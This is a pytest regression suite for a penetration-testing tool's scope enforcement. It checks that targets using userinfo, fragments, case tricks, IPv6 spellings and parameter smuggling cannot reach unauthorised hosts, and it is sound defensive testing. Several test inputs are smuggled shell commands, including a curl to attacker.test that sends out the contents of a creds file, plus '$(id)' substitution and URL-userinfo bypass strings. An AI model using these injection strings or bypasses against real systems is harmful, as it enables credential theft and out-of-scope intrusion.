"""Regression tests for scope enforcement holes.

Every test here encodes a confirmed bypass: a target (or a secondary parameter
that becomes a network destination) that validated as IN-SCOPE while the request
actually left for a host the engagement never authorised.

Only reserved domains are used (RFC 2606 ``example.com``, RFC 6761 ``.test`` /
``.invalid``, RFC 3849 ``2001:db8::/32``).
"""

from __future__ import annotations

import pytest

from kambo.models import Context, EngagementScope, ScopeTarget
from kambo.scope import ScopeManager, ScopeViolationError, get_scope_manager

from tests.conftest import patch_runner


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------


def _manager(
    targets: list[ScopeTarget], exclusions: list[str] | None = None, **kw
) -> ScopeManager:
    manager = ScopeManager()
    manager.set_scope(
        EngagementScope(
            engagement_id=kw.pop("engagement_id", "REG-001"),
            context=kw.pop("context", Context.BUG_BOUNTY),
            targets=targets,
            exclusions=exclusions or [],
            **kw,
        )
    )
    return manager


def _install_scope(
    targets: list[str], exclusions: list[str] | None = None, engagement_id: str = "REG-001"
) -> None:
    """Point the global scope manager at a narrow engagement."""
    get_scope_manager().set_scope(
        EngagementScope(
            engagement_id=engagement_id,
            context=Context.BUG_BOUNTY,
            targets=[ScopeTarget(target=t) for t in targets],
            exclusions=exclusions or [],
        )
    )


def _blocked(manager: ScopeManager, target: str) -> bool:
    try:
        manager.validate(target)
    except ScopeViolationError:
        return True
    return False


def _hosts_touched(runner) -> list[str]:
    return [c["command"] for c in runner._calls]


# ---------------------------------------------------------------------------
# 1. host extraction — query string / fragment / missing scheme (scope.py:140)
# ---------------------------------------------------------------------------


class TestHostExtraction:
    @pytest.mark.parametrize(
        "target",
        [
            "https://attacker.test?x=.example.com",
            "https://attacker.test#.example.com",
            "attacker.test/#.example.com",
            "attacker.test/redir?to=https://safe.example.com",
            "attacker.test?x=.example.com",
            "https://attacker.test/redir?to=https://safe.example.com",
        ],
    )
    def test_wildcard_scope_rejects_embedded_host(self, target: str) -> None:
        manager = _manager([ScopeTarget(target="*.example.com")])
        assert _blocked(manager, target), f"{target!r} validated as in-scope"

    @pytest.mark.parametrize(
        "target",
        [
            "https://www.example.com:anything@attacker.test/admin",
            "https://www.example.com@attacker.test/",
            "https://www.example.com:8080@attacker.test/",
            "https://attacker.test/@www.example.com",
        ],
    )
    def test_userinfo_is_not_a_host(self, target: str) -> None:
        manager = _manager([ScopeTarget(target="www.example.com")])
        assert _blocked(manager, target), f"{target!r} validated as in-scope"

    def test_userinfo_bypasses_neither_exclusion_kind(self) -> None:
        manager = _manager(
            [ScopeTarget(target="*.example.com", exclusions=["admin.example.com"])],
            exclusions=["secret.example.com"],
        )
        assert _blocked(manager, "https://www.example.com:x@admin.example.com/")
        assert _blocked(manager, "https://www.example.com:x@secret.example.com/")

    @pytest.mark.parametrize(
        "target",
        [
            "www.example.com",
            "https://www.example.com/admin",
            "https://www.example.com:8443/admin",
            "https://WWW.EXAMPLE.COM/",
            "www.example.com.",
        ],
    )
    def test_legitimate_forms_still_validate(self, target: str) -> None:
        manager = _manager([ScopeTarget(target="www.example.com")])
        assert manager.validate(target) is True


# ---------------------------------------------------------------------------
# 2. case / whitespace normalisation (scope.py:115 and :123)
# ---------------------------------------------------------------------------


class TestCaseNormalisation:
    @pytest.mark.parametrize(
        "target",
        [
            "ADMIN.example.com",
            "Admin.Example.com",
            "aDmIn.example.com",
            " admin.example.com",
            "admin.example.com.",
            "https://ADMIN.example.com/x",
        ],
    )
    def test_global_exclusion_is_case_insensitive(self, target: str) -> None:
        manager = _manager(
            [ScopeTarget(target="*.example.com")], exclusions=["admin.example.com"]
        )
        assert _blocked(manager, target), f"{target!r} escaped the exclusion"

    @pytest.mark.parametrize("target", ["ADMIN.example.com", " admin.example.com"])
    def test_per_target_exclusion_is_case_insensitive(self, target: str) -> None:
        manager = _manager(
            [ScopeTarget(target="*.example.com", exclusions=["admin.example.com"])]
        )
        assert _blocked(manager, target), f"{target!r} escaped the exclusion"

    def test_mixed_case_exclusion_pattern_also_blocks(self) -> None:
        manager = _manager(
            [ScopeTarget(target="*.example.com")], exclusions=["Admin.Example.com"]
        )
        assert _blocked(manager, "admin.example.com")

    def test_mixed_case_in_scope_host_is_allowed(self) -> None:
        manager = _manager([ScopeTarget(target="*.example.com")])
        assert manager.validate("WWW.EXAMPLE.COM") is True


# ---------------------------------------------------------------------------
# 3. URL-form / path-form exclusion patterns (scope.py:149)
# ---------------------------------------------------------------------------


class TestExclusionPatternForms:
    @pytest.mark.parametrize(
        "target",
        [
            "admin.example.com",
            "https://admin.example.com/",
            "http://admin.example.com",
            "https://admin.example.com/panel",
        ],
    )
    def test_url_form_exclusion_blocks_the_host(self, target: str) -> None:
        manager = _manager(
            [ScopeTarget(target="*.example.com")], exclusions=["https://admin.example.com"]
        )
        assert _blocked(manager, target), f"{target!r} escaped the URL-form exclusion"

    def test_path_form_exclusion_blocks_the_host(self) -> None:
        manager = _manager(
            [ScopeTarget(target="*.example.com")], exclusions=["example.com/wp-admin"]
        )
        assert _blocked(manager, "https://example.com/wp-admin")
        assert _blocked(manager, "example.com")

    def test_url_form_allow_target_does_not_widen_scope(self) -> None:
        """A path-bearing allow pattern must never authorise the whole host."""
        manager = _manager([ScopeTarget(target="https://app.example.com/api")])
        assert _blocked(manager, "app.example.com")
        assert _blocked(manager, "other.example.com")

    def test_url_form_allow_target_without_path_matches_its_host(self) -> None:
        manager = _manager([ScopeTarget(target="https://app.example.com")])
        assert manager.validate("app.example.com") is True
        assert _blocked(manager, "other.example.com")


# ---------------------------------------------------------------------------
# 4. IP exclusions compared as addresses, not strings (scope.py:158)
# ---------------------------------------------------------------------------


class TestIpExclusions:
    @pytest.mark.parametrize(
        "target",
        [
            "2001:db8::1",
            "2001:DB8::1",
            "2001:0db8:0000:0000:0000:0000:0000:0001",
            "2001:db8:0:0::1",
            "[2001:DB8::1]:443",
        ],
    )
    def test_ipv6_exclusion_matches_every_spelling(self, target: str) -> None:
        manager = _manager(
            [ScopeTarget(target="2001:db8::/32")], exclusions=["2001:db8::1"]
        )
        assert _blocked(manager, target), f"{target!r} escaped the IPv6 exclusion"

    def test_other_ipv6_in_range_still_allowed(self) -> None:
        manager = _manager(
            [ScopeTarget(target="2001:db8::/32")], exclusions=["2001:db8::1"]
        )
        assert manager.validate("2001:db8::2") is True

    def test_ipv4_exclusion_and_cidr_allow_still_work(self) -> None:
        manager = _manager(
            [ScopeTarget(target="192.168.1.0/24")], exclusions=["192.168.1.1"]
        )
        assert manager.validate("192.168.1.50") is True
        assert _blocked(manager, "192.168.1.1")
        assert _blocked(manager, "http://192.168.1.1/")
        assert _blocked(manager, "10.0.0.1")


# ---------------------------------------------------------------------------
# 5. api_security — endpoint parameters are not validated (api_security.py:68)
# ---------------------------------------------------------------------------

_USERINFO_PATH = "@attacker.test/api/users/1"


class TestApiSecurityEndpoints:
    def setup_method(self) -> None:
        _install_scope(["example.com", "*.example.com"])

    async def _assert_no_touch(self, coro_factory) -> None:
        with patch_runner({}) as runner:
            with pytest.raises(ScopeViolationError):
                await coro_factory()
            assert not any("attacker.test" in c for c in _hosts_touched(runner))

    async def test_bola_rejects_userinfo_endpoint(self) -> None:
        from kambo.tools.api_security import api_test_bola

        await self._assert_no_touch(
            lambda: api_test_bola("example.com", "a", "b", endpoints=[_USERINFO_PATH])
        )

    async def test_bfla_rejects_userinfo_endpoint(self) -> None:
        from kambo.tools.api_security import api_test_bfla

        await self._assert_no_touch(
            lambda: api_test_bfla("example.com", "t", admin_endpoints=["@attacker.test/api/admin"])
        )

    async def test_bopla_rejects_userinfo_endpoint(self) -> None:
        from kambo.tools.api_security import api_test_bopla

        await self._assert_no_touch(
            lambda: api_test_bopla("example.com", "@attacker.test/p", "t")
        )

    async def test_resource_rejects_userinfo_endpoint(self) -> None:
        from kambo.tools.api_security import api_test_resource

        await self._assert_no_touch(
            lambda: api_test_resource("example.com", endpoint="@attacker.test/r")
        )

    async def test_bopla_rejects_shell_metacharacters(self) -> None:
        from kambo.tools.api_security import api_test_bopla

        with patch_runner({}) as runner:
            with pytest.raises(ScopeViolationError):
                await api_test_bopla("example.com", '/a";curl https://attacker.test;"', "t")
            assert not any("attacker.test" in c for c in _hosts_touched(runner))

    async def test_plain_paths_still_work(self) -> None:
        from kambo.tools.api_security import api_test_bola

        with patch_runner({}) as runner:
            result = await api_test_bola("example.com", "a", "b", endpoints=["/api/users/1"])
            assert result["total_tested"] == 1
            assert all("example.com" in c for c in _hosts_touched(runner))


# ---------------------------------------------------------------------------
# 6. containers — api_server overrides the validated target (containers.py:93)
# ---------------------------------------------------------------------------


class TestK8sApiServer:
    def setup_method(self) -> None:
        _install_scope(["k8s.example.com", "*.example.com"])

    async def test_out_of_scope_api_server_is_refused(self) -> None:
        from kambo.tools.containers import k8s_rbac_enum

        with patch_runner({}) as runner:
            with pytest.raises(ScopeViolationError):
                await k8s_rbac_enum(
                    "k8s.example.com", token="tok", api_server="https://attacker.test:6443"
                )
            assert not any("attacker.test" in c for c in _hosts_touched(runner))

    async def test_injection_in_api_server_is_refused(self) -> None:
        from kambo.tools.containers import k8s_rbac_enum

        with patch_runner({}) as runner:
            with pytest.raises(ScopeViolationError):
                await k8s_rbac_enum(
                    "k8s.example.com",
                    token="tok",
                    api_server="https://k8s.example.com:6443; curl https://attacker.test",
                )
            assert not any("attacker.test" in c for c in _hosts_touched(runner))

    async def test_in_scope_api_server_still_works(self) -> None:
        from kambo.tools.containers import k8s_rbac_enum

        with patch_runner({}) as runner:
            await k8s_rbac_enum(
                "k8s.example.com", token="tok", api_server="https://api.example.com:6443"
            )
            assert any("api.example.com:6443" in c for c in _hosts_touched(runner))


# ---------------------------------------------------------------------------
# 7. scanning — swagger_paths are not validated (scanning.py:222)
# ---------------------------------------------------------------------------


class TestSwaggerPaths:
    def setup_method(self) -> None:
        _install_scope(["example.com", "*.example.com"])

    async def test_userinfo_swagger_path_is_refused(self) -> None:
        from kambo.tools.scanning import scan_api_endpoints

        with patch_runner({}) as runner:
            with pytest.raises(ScopeViolationError):
                await scan_api_endpoints(
                    "example.com", swagger_paths=["@attacker.test/swagger.json"]
                )
            assert not any("attacker.test" in c for c in _hosts_touched(runner))

    async def test_command_substitution_swagger_path_is_refused(self) -> None:
        from kambo.tools.scanning import scan_api_endpoints

        with patch_runner({}) as runner:
            with pytest.raises(ScopeViolationError):
                await scan_api_endpoints("example.com", swagger_paths=["/$(id)/swagger.json"])
            assert not any("$(id)" in c for c in _hosts_touched(runner))

    async def test_plain_swagger_paths_still_work(self) -> None:
        from kambo.tools.scanning import scan_api_endpoints

        with patch_runner({}) as runner:
            await scan_api_endpoints("example.com", swagger_paths=["/swagger.json"])
            assert any("https://example.com/swagger.json" in c for c in _hosts_touched(runner))


# ---------------------------------------------------------------------------
# 8. cloud — repo_url is cloned from an arbitrary host (cloud.py:224)
# ---------------------------------------------------------------------------


class TestSecretScanRepoUrl:
    def setup_method(self) -> None:
        _install_scope(["example.com", "*.example.com"])

    async def test_arbitrary_host_repo_is_refused(self) -> None:
        from kambo.tools.cloud import cloud_secret_scan

        with patch_runner({}) as runner:
            with pytest.raises(ScopeViolationError):
                await cloud_secret_scan("example.com", repo_url="https://attacker.test/repo.git")
            assert not any("attacker.test" in c for c in _hosts_touched(runner))

    async def test_injection_in_repo_url_is_refused(self) -> None:
        from kambo.tools.cloud import cloud_secret_scan

        with patch_runner({}) as runner:
            with pytest.raises(ScopeViolationError):
                await cloud_secret_scan(
                    "example.com", repo_url="x; curl https://attacker.test/$(cat /output/creds)"
                )
            assert not any("attacker.test" in c for c in _hosts_touched(runner))

    async def test_known_code_host_still_allowed(self) -> None:
        from kambo.tools.cloud import cloud_secret_scan

        with patch_runner({}) as runner:
            await cloud_secret_scan("example.com", repo_url="https://github.com/org/repo.git")
            assert any("github.com/org/repo.git" in c for c in _hosts_touched(runner))

    async def test_in_scope_repo_host_still_allowed(self) -> None:
        from kambo.tools.cloud import cloud_secret_scan

        with patch_runner({}) as runner:
            await cloud_secret_scan("example.com", repo_url="https://git.example.com/org/repo.git")
            assert any("git.example.com" in c for c in _hosts_touched(runner))


# ---------------------------------------------------------------------------
# 9. platform_submit_report — irreversible write with no scope gate
# ---------------------------------------------------------------------------


class TestSubmitReportGate:
    @pytest.fixture(autouse=True)
    async def _isolated_store(self, tmp_path, monkeypatch):
        """Never read the operator's real findings store from a test."""
        import kambo.database as database

        db = database.Database(tmp_path / "submit.db")
        await db.connect()
        monkeypatch.setattr(database, "_db", db)
        yield
        await db.close()

    def _report(self, **kw) -> dict:
        base = {
            "title": "IDOR on the customer portal",
            "body": "Full PoC against api.example.com",
            "asset": "api.example.com",
        }
        base.update(kw)
        return base

    async def test_platform_mismatch_is_refused(self, monkeypatch) -> None:
        import kambo.tools.platforms as platforms

        called: list = []
        monkeypatch.setattr(platforms, "h1_submit_report", lambda *a, **k: called.append(a))
        get_scope_manager().set_scope(
            EngagementScope(
                engagement_id="prog-b",
                context=Context.BUG_BOUNTY,
                platform="bugcrowd",
                targets=[ScopeTarget(target="*.bravo.example.com")],
            )
        )
        result = await platforms.platform_submit_report(
            "hackerone", "some-other-program", self._report()
        )
        assert "error" in result
        assert called == []

    async def test_out_of_scope_asset_is_refused(self, monkeypatch) -> None:
        import kambo.tools.platforms as platforms

        called: list = []
        monkeypatch.setattr(platforms, "h1_submit_report", lambda *a, **k: called.append(a))
        _install_scope(["*.bravo.example.com"])
        result = await platforms.platform_submit_report(
            "hackerone", "prog", self._report(asset="api.alpha.example.com")
        )
        assert "error" in result
        assert called == []

    async def test_no_scope_is_refused(self, monkeypatch) -> None:
        import kambo.tools.platforms as platforms

        called: list = []
        monkeypatch.setattr(platforms, "h1_submit_report", lambda *a, **k: called.append(a))
        get_scope_manager().clear_scope()
        result = await platforms.platform_submit_report("hackerone", "prog", self._report())
        assert "error" in result
        assert called == []

    async def test_other_engagement_finding_cannot_be_submitted(self, monkeypatch) -> None:
        """The catastrophic case: program A's PoC filed against program B."""
        import kambo.tools.platforms as platforms
        from kambo.tools.reporting import report_finding

        called: list = []
        monkeypatch.setattr(platforms, "h1_submit_report", lambda *a, **k: called.append(a))

        _install_scope(["*.alpha.example.com"], engagement_id="prog-a")
        await report_finding(
            "IDOR on Alpha portal", "high", "api.alpha.example.com", "alpha", confidence="firm"
        )

        get_scope_manager().set_scope(
            EngagementScope(
                engagement_id="prog-b",
                context=Context.BUG_BOUNTY,
                platform="hackerone",
                targets=[ScopeTarget(target="*.bravo.example.com")],
            )
        )
        result = await platforms.platform_submit_report(
            "hackerone",
            "prog-b",
            {
                "title": "IDOR on Alpha portal",
                "body": "Full PoC against api.alpha.example.com",
                "asset": "www.bravo.example.com",
            },
        )
        assert "error" in result
        assert called == []

    async def test_in_scope_submission_still_goes_through(self, monkeypatch) -> None:
        import kambo.tools.platforms as platforms

        called: list = []

        def _fake(*args, **kwargs):
            called.append(args)
            return {"platform": "hackerone", "report_id": "1", "status": "submitted"}

        monkeypatch.setattr(platforms, "h1_submit_report", _fake)
        get_scope_manager().set_scope(
            EngagementScope(
                engagement_id="prog-a",
                context=Context.BUG_BOUNTY,
                platform="hackerone",
                targets=[ScopeTarget(target="*.example.com")],
            )
        )
        result = await platforms.platform_submit_report("hackerone", "prog-a", self._report())
        assert result.get("status") == "submitted"
        assert len(called) == 1


# ---------------------------------------------------------------------------
# 10. report_export — findings from other engagements leak into the report
# ---------------------------------------------------------------------------


class TestReportExportIsolation:
    async def test_export_only_contains_the_active_engagement(self, tmp_path, monkeypatch) -> None:
        import kambo.database as database
        from kambo.tools.reporting import report_export, report_finding

        db = database.Database(tmp_path / "iso.db")
        await db.connect()
        monkeypatch.setattr(database, "_db", db)
        try:
            _install_scope(["*.alpha.example.com"], engagement_id="prog-a")
            await report_finding(
                "IDOR on Alpha customer portal",
                "high",
                "api.alpha.example.com",
                "alpha description",
                confidence="firm",
            )

            _install_scope(["*.bravo.example.com"], engagement_id="prog-b")
            await report_finding(
                "XSS on Bravo",
                "medium",
                "www.bravo.example.com",
                "bravo description",
                confidence="firm",
            )

            exported = await report_export(format="json")
            titles = [f["title"] for f in exported["findings"]]
            assert titles == ["XSS on Bravo"]

            markdown = await report_export(format="markdown", template="bug_bounty")
            assert "alpha" not in markdown["content"].lower()
        finally:
            await db.close()

    async def test_export_without_scope_is_refused(self, tmp_path, monkeypatch) -> None:
        import kambo.database as database
        from kambo.tools.reporting import report_export

        db = database.Database(tmp_path / "noscope.db")
        await db.connect()
        monkeypatch.setattr(database, "_db", db)
        try:
            get_scope_manager().clear_scope()
            result = await report_export(format="json")
            assert "error" in result
            assert not result.get("findings")
        finally:
            await db.close()
